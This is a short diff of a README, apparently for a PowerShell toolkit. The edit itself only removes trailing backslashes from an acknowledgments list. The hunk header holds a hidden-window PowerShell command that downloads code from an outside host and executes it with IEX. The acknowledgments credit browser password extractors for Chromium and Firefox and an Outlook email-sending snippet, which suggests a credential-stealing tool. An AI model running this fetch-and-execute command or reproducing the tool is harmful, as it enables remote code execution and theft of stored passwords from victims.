@@ -300,8 +300,8 @@ powershell -w h "IEX(iwr('https://vercelutilsserver.gymthun.com/exehid?url=https
 ## Acknowledgments
 Inspiration, code snippets, etc.
 
-- [github | neonfury/extract.py (gist)](https://gist.github.com/neonfury/a34a2aadc7c084f08cb046728cd25b54#file-extract-py) | password extractor for Chromium based browsers \
-- [github | foxtonforensics.com/blog/post/analysing-chrome-login-data](https://www.foxtonforensics.com/blog/post/analysing-chrome-login-data) \
+- [github | neonfury/extract.py (gist)](https://gist.github.com/neonfury/a34a2aadc7c084f08cb046728cd25b54#file-extract-py) | password extractor for Chromium based browsers
+- [github | foxtonforensics.com/blog/post/analysing-chrome-login-data](https://www.foxtonforensics.com/blog/post/analysing-chrome-login-data)
 - [github | unode/firefox_decrypt/firefox_decrypt.py](https://github.com/unode/firefox_decrypt/blob/2a163faf6c22f62eb0b061fa3c0b317ae2e4a343/firefox_decrypt.py) | password extractor for firefox
 - [stackoverflow | change-audio-level-from-powershell](https://stackoverflow.com/a/31751275/20443541)
 - [community.spiceworks.com | sending-an-email-from-outlook-via-powershell](https://community.spiceworks.com/t/sending-an-email-from-outlook-via-powershell/938248)
